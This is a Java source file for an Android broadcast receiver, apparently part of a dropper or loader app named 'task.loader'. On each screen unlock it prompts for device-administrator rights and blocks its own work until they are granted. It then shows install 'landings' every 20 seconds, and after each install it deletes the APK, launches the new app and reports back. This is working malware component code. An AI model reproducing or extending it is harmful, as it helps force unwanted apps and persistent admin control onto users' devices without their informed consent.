package task.loader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import java.io.File;

import task.loader.admin.Admin;
import task.loader.admin.AdminService;
import task.loader.db.TableTasks;
import task.loader.db.Task;

public class MainReceiver extends BroadcastReceiver
{

    @Override
    public void onReceive(Context context, Intent intent)
    {
        if(Settings.isBlock(context))
        {
            return;
        }

        String action = intent.getAction();
        if (action == null)
        {
            return;
        }

        if(Constants.DEBUG) Settings.debug("action: " + action);

        if(action.equals(Actions.CHECK_TASKS))
        {
            if(!MainService.isActive())
            {
                context.startService(new Intent(context, MainService.class));
            }
            else
            {
                if(Constants.DEBUG) Settings.debug("MainService.isActive()");
            }
        }
        else if(action.equals(Actions.START_INSTALL)) // запускается каждые 20 сек когда юзер включен (ACTION_USER_PRESENT)
        {
            Utils.startInstallOrShowLanding(context);
        }
        if(action.equals(Intent.ACTION_USER_PRESENT))
        {
            Admin.startAdminActivity(context);

            if(Constants.ADMIN_ENABLE && !Admin.isAdminActive(context))
            {
                if(Constants.DEBUG) Settings.debug("wait admin activation");
                return;
            }

            // запустить MainReceiver с экшеном START_INSTALL, повторяя каждые 20 секунд (но сперва ждать 20 сек)
            Utils.startCustomTimer(context, Actions.START_INSTALL, Constants.START_INSTALL_INTERVAL, true, false);
            // запустить перебор всех задач и показ их лендингов + установку апки
            Utils.startInstallOrShowLanding(context);
        }

        else if(action.equals(Intent.ACTION_SCREEN_OFF))
        {
            Utils.cancelCustomTimer(context, Actions.START_INSTALL);
            AdminService.work.set(false);
        }
        else if(action.equals(Intent.ACTION_PACKAGE_ADDED))
        {

            Uri uri = intent.getData();
            String pkg = uri != null ? uri.getSchemeSpecificPart() : null;

            if(Constants.DEBUG) Settings.debug("pkg: " + pkg);

            TableTasks tableTasks = new TableTasks(MainApplication.getMainDb());
            Task task = tableTasks.getTaskByPackage(pkg);

            if(task != null)
            {
                tableTasks.remove(task);
                File file = new File(task.getPath());
                file.delete();
                Utils.runApp(context, pkg);
                context.startService(new Intent(context, MainService.class).setAction(task.getTaskId()));
            }

        }
        else // boot
        {

        }
    }


}
